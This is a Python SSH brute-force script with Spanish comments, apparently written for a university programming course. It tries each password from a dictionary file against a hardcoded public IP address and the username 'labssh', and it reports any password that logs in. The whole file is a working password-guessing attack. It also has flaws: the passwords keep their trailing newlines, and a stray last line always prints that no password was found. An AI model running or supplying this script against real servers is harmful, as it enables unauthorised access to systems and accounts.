import paramiko # Importamos la librería paramiko

ruta_dic = "D:/Universidad_Axel/Cuatrimestres/Quinto_Cuatrimestre/Programacion_Avanzada/diccionario_pass.txt"
def cargar_passwords_desde_archivo(ruta_archivo):
    try:
        with open(ruta_archivo, "r") as archivo:
            passwords = archivo.readlines()
            if not passwords:
                print(f"El archivo '{ruta_archivo}' está vacío.")
                exit(1)
            return passwords
    except FileNotFoundError:
        print(f"El archivo '{ruta_archivo}' no fue encontrado.")
        exit(1)
        
        
def fuerza_bruta_ssh(host, usuario, lista_claves): # Definimos la función fuerza_bruta_ssh con los parametros host, usuario y lista_claves
    cliente = paramiko.SSHClient() # Creamos un objeto SSHClient
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Establecemos la política para agregar automáticamente la clave de host

    for passw in lista_claves: # Iteramos sobre la lista de passwords
        try: 
            print(f"Intentando password: {passw}") # Imprimimos el intento de password
            cliente.connect(host, port=22, username=usuario, password=passw) # Intentamos conectar con la password actual
            print(f"password encontrada: {passw}") # Si se conecta, imprimimos la password encontrada
            return passw # Retornamos la password encontrada
        except paramiko.AuthenticationException: # Si se produce un AuthenticationException, significa que la password es incorrecta
            print(f"password {passw} falló.") # Imprimimos que la password falló
        except Exception as e: # Si se produce cualquier otro tipo de excepción
            print(f"Error: {e}") # Imprimimos el error
            break # Salimos del bucle
    cliente.close() # Cerramos el cliente SSH
    return None  # Si no se encuentra ninguna password, retornamos None

if __name__ == "__main__": 
    host = "74.179.81.132"  # Cambia esto por la dirección IP del servidor
    usuario = "labssh"  # Cambia esto por el nombre de usuario
    lista_pass = cargar_passwords_desde_archivo(ruta_dic)  # Lista de passwords a probar

    password_encontrada = fuerza_bruta_ssh(host, usuario, lista_pass) # Llamamos a la función fuerza_bruta_ssh con los parámetros host, usuario
    if password_encontrada: # Si se encontró una password
        print(f"Ingreso exitoso con la password: {password_encontrada}") # Imprimimos el mensaje de ingreso exitoso
    else: # Si no se encontró ninguna password
        print("No se encontró una password válida.") # Imprimimos el mensaje de no encontrar password
print("No se encontró una password válida.") # Imprimimos el mensaje de no encontrar password
